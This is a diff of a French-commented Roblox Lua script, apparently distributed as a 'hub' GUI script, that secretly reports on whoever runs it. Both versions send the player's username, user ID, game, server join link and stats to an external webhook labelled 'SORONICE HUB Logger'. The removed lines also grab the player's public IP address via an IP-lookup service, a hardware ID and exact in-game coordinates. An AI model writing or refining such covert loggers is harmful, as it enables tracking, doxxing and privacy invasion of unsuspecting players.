@@ -1,11 +1,11 @@
 -- Gui to Lua V5.1 (Shadow Edition)
--- GUI : WEBHOOK_URL
+-- GUI : 2WEBHOOK_URL
 
 local Players   = game:GetService('Players')
 local player    = Players.LocalPlayer
 local PlayerGui = player:WaitForChild('PlayerGui')
 
-local _old = PlayerGui:FindFirstChild([[WEBHOOK_URL]])
+local _old = PlayerGui:FindFirstChild([[2WEBHOOK_URL]])
 if _old then _old:Destroy() end
 
 local _i = {}
@@ -17,7 +17,7 @@ _i[1].DisplayOrder = 0
 _i[1].Enabled = true
 _i[1].IgnoreGuiInset = false
 _i[1].ResetOnSpawn = true
-_i[1].Name = [[WEBHOOK_URL]]
+_i[1].Name = [[2WEBHOOK_URL]]
 
 
 -- FAKE REQUIRE SYSTEM FOR MODULES
@@ -35,7 +35,7 @@ end
 
 -- Scripts:
 
-local function SAQIA_fake_script()
+local function TXQTO_fake_script()
 	local script = Instance.new('LocalScript')
 	script.Name = [[LocalScript]]
 	script.Parent = _i[1]
@@ -71,42 +71,23 @@ local function SAQIA_fake_script()
 	-- 3. ENVOI DU WEBHOOK
 	if httpRequest then
 		spawn(function()
-			local successGame, gameInfo = pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
+			-- Récupération du vrai nom du jeu
+			local successGame, gameInfo = pcall(function()
+				return MarketplaceService:GetProductInfo(game.PlaceId)
+			end)
 			local gameName = successGame and gameInfo.Name or "Nom du jeu inconnu"
-			local joinLink = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
+	
+			-- Les vrais liens (Page Web + Lien direct serveur)
 			local webLink = "https://www.roblox.com/games/" .. tostring(game.PlaceId)
-			local playerCount = #Players:GetPlayers()
-			local maxPlayers = Players.MaxPlayers
+			local joinLink = "roblox://experiences/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. tostring(game.JobId)
 	
-			local deviceType = "Ordinateur 💻"
-			if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then deviceType = "Mobile / Tablette 📱"
-			elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then deviceType = "Console 🎮"
-			elseif UserInputService.VREnabled then deviceType = "Casque VR 🥽" end
+			-- Récupération des statistiques du joueur
+			local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+			local humanoid = char:WaitForChild("Humanoid", 5)
+			local walkSpeed = humanoid and tostring(humanoid.WalkSpeed) or "Inconnu"
+			local jumpPower = humanoid and tostring(humanoid.JumpPower) or "Inconnu"
 	
-			local ping = "Inconnu"
-			pcall(function() ping = string.split(Stats.Network.ServerStatsItem["Data Ping"]:GetValueString(), " ")[1] .. " ms" end)
-			local fps = tostring(math.floor(Workspace:GetRealPhysicsFPS())) .. " FPS"
-	
-			local accountAge = tostring(LocalPlayer.AccountAge) .. " jours"
-			local isPremium = LocalPlayer.MembershipType == Enum.MembershipType.Premium and "Oui 🌟" or "Non ❌"
-			local playerTeam = LocalPlayer.Team and LocalPlayer.Team.Name or "Aucune / Neutre"
-	
-			local char = LocalPlayer.Character
-			local humanoid = char and char:FindFirstChild("Humanoid")
-			local rootPart = char and char:FindFirstChild("HumanoidRootPart")
-	
-			local walkSpeed = humanoid and tostring(math.floor(humanoid.WalkSpeed)) or "Inconnu"
-			local jumpPower = humanoid and tostring(math.floor(humanoid.JumpPower)) or "Inconnu"
-			local health = humanoid and tostring(math.floor(humanoid.Health)) .. " / " .. tostring(math.floor(humanoid.MaxHealth)) or "Inconnu"
-	
-			local positionTxt = "Inconnue"
-			if rootPart then
-				positionTxt = "X: " .. math.floor(rootPart.Position.X) .. ", Y: " .. math.floor(rootPart.Position.Y) .. ", Z: " .. math.floor(rootPart.Position.Z)
-			end
-			
-			-- Appel de la fonction et stockage de l'IP dans une variable
-			local adresseIPPublique = recupererAdresseIP()
-	
+			-- Récupération de l'argent (Leaderstats)
 			local moneyInfo = "Non détecté"
 			if LocalPlayer:FindFirstChild("leaderstats") then
 				local stats = {}
@@ -114,22 +95,6 @@ local function SAQIA_fake_script()
 					table.insert(stats, stat.Name .. ": " .. tostring(stat.Value))
 				end
 				if #stats > 0 then moneyInfo = table.concat(stats, " | ") end
-			end
-	
-	
-			local apiUrl = "https://api.ipify.org"
-	
-			local function recupererAdresseIP()
-				local executionReussie, resultat = pcall(function()
-					return game:HttpGet(apiUrl)
-				end)
-	
-				-- Vérification du résultat de la requête
-				if executionReussie then
-					return resultat
-				else
-					return "Erreur : Ton exécuteur ne supporte pas game:HttpGet."
-				end
 			end
 	
 			local myAvatar = GetRealHeadShotAPI(LocalPlayer.UserId)
@@ -140,35 +105,32 @@ local function SAQIA_fake_script()
 				["avatar_url"] = myAvatar,
 				["content"] = "", 
 				["embeds"] = {{
-					["title"] = "🔴 BAN",
+					["title"] = "🟢 Script Rayfield Activé",
 					["description"] = "Un joueur a exécuté le script avec **" .. executorName .. "**.",
-					["color"] = 15548997,
+					["color"] = 65280,
 					["thumbnail"] = {
 						["url"] = myAvatar
 					},
 					["fields"] = {
-						{["name"] = "👤 Pseudo", ["value"] = "```" .. LocalPlayer.Name .. "```", ["inline"] = true},
-						{["name"] = "🏷️ Surnom", ["value"] = "```" .. LocalPlayer.DisplayName .. "```", ["inline"] = true},
-						{["name"] = "🆔 ID Joueur", ["value"] = "```" .. tostring(LocalPlayer.UserId) .. "```", ["inline"] = true},
-						{["name"] = "💻 HWID (Machine ID)", ["value"] = "`" .. hwid .. "`", ["inline"] = false},
-						{["name"] = "📅 Âge du Compte", ["value"] = accountAge, ["inline"] = true},
-						{["name"] = "💎 Premium Roblox", ["value"] = isPremium, ["inline"] = true},
-						{["name"] = "🖥️ Appareil", ["value"] = deviceType, ["inline"] = true},
-						{["name"] = "📡 Ping", ["value"] = ping, ["inline"] = true},
-						{["name"] = "🎞️ FPS", ["value"] = fps, ["inline"] = true},
-						{["name"] = "🏳️ Équipe", ["value"] = playerTeam, ["inline"] = true},
-						{["name"] = "🎮 Jeu Actuel", ["value"] = "**" .. gameName .. "**", ["inline"] = true},
-						{["name"] = "👥 Joueurs", ["value"] = tostring(playerCount) .. " / " .. tostring(maxPlayers), ["inline"] = true},
-						{["name"] = "🌍 PlaceId", ["value"] = "`" .. tostring(game.PlaceId) .. "`", ["inline"] = true},
-						{["name"] = "❤️ Santé", ["value"] = health, ["inline"] = true},
-						{["name"] = "🏃 Vitesse / Saut", ["value"] = walkSpeed .. " / " .. jumpPower, ["inline"] = true},
-						{["name"] = "📍 Coordonnées Exactes", ["value"] = "`" .. positionTxt .. "`", ["inline"] = true},
-						{["name"] = "💰 Leaderstats", ["value"] = "```" .. moneyInfo .. "```", ["inline"] = false},
-						{["name"] = "📍 IP Public", ["value"] = "```" .. adresseIPPublique .. "```", ["inline"] = false},
-						{["name"] = "🔗 Liens Rapides", ["value"] = "[🌐 Ouvrir la page web]("..webLink..")\n\n**🚀 Lien d'auto-rejoindre (PC) :**\n`" .. joinLink .. "`\n\n**🔑 JobId Brut :**\n`" .. game.JobId .. "`", ["inline"] = false}
+						-- Infos Joueur
+						{["name"] = "👤 Pseudo", ["value"] = LocalPlayer.Name, ["inline"] = true},
+						{["name"] = "🏷️ Surnom", ["value"] = LocalPlayer.DisplayName, ["inline"] = true},
+						{["name"] = "🆔 ID Joueur", ["value"] = tostring(LocalPlayer.UserId), ["inline"] = true},
+	
+						-- Infos Jeu
+						{["name"] = "🎮 Jeu Actuel", ["value"] = gameName, ["inline"] = true},
+						{["name"] = "🌍 PlaceId", ["value"] = tostring(game.PlaceId), ["inline"] = true},
+	
+						-- VRAIS LIENS ICI
+						{["name"] = "🔗 Page web du jeu", ["value"] = webLink, ["inline"] = false},
+						{["name"] = "🚀 Rejoindre son serveur", ["value"] = "Lien direct PC : \n`" .. joinLink .. "`\n\nJobId (pour extensions) : \n`" .. game.JobId .. "`", ["inline"] = false},
+	
+						-- Stats
+						{["name"] = "🏃 Vitesse", ["value"] = walkSpeed, ["inline"] = true},
+						{["name"] = "🦘 Saut", ["value"] = jumpPower, ["inline"] = true},
+						{["name"] = "💰 Argent", ["value"] = moneyInfo, ["inline"] = false}
 					},
-					["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ"),
-					["footer"] = { ["text"] = "SORONICE HUB Logger • ID Serveur: " .. game.JobId }
+					["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
 				}}
 			}
 	
@@ -181,8 +143,11 @@ local function SAQIA_fake_script()
 			})
 		end)
 	end
+	
+	
+	
 end
-coroutine.wrap(SAQIA_fake_script)()
+coroutine.wrap(TXQTO_fake_script)()
 
 
 _i[1].Parent = PlayerGui
